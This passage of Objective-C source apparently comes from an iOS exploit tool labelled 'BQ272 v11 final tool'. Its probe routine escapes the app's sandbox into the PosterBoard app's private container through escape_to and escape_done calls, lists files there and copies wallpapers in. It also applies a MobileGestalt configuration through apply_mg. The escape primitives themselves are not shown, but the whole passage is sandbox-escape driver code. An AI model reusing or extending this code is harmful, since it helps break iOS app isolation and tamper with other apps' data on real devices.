            bqlog(@"mg: no %@ (read-only backup mode)", cfgPath);
        }
    }
    escape_done(groot, h, @"mgapply");
}

void BQRunProbe(void) {
    @autoreleasepool {
        if (!gLogPath) {
            gLogPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]
                        stringByAppendingPathComponent:@"bq272.log"];
        }
        if (!gLock) gLock = [NSLock new];
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

        bqlog(@"================ BQ272 v11 final tool ================");
        bqlog(@"date=%@ uid=%d", [NSDate date], getuid());
        load_mcm();

        NSString *group = @"group.8e0bc870a21520b9.1";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        NSString *groot = groupURL.path;
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        bqlog(@"group=%@", groupURL);

        apply_mg(group, groot, docs);

        NSString *pb = [[NSUserDefaults standardUserDefaults] stringForKey:@"PBContainer"];
        if (!pb.length) {
            pb = scan_pb_container(group, groot);
            if (pb.length) {
                [[NSUserDefaults standardUserDefaults] setObject:pb forKey:@"PBContainer"];
                [[NSUserDefaults standardUserDefaults] synchronize];
            }
        }
        bqlog(@"PosterBoard container=%@", pb);

        if (pb.length) {
            NSString *link = nil;
            int64_t h = escape_to(group, groot, pb, @"pb", &link);
            if (h >= 0) {
                list_dir([link stringByAppendingPathComponent:@"Library/Application Support"], 20);
                copy_wallpapers(docs, link);
                escape_done(groot, h, @"pb");
            }
        }

        bqlog(@"================ PROBE_DONE ================");
    }
}
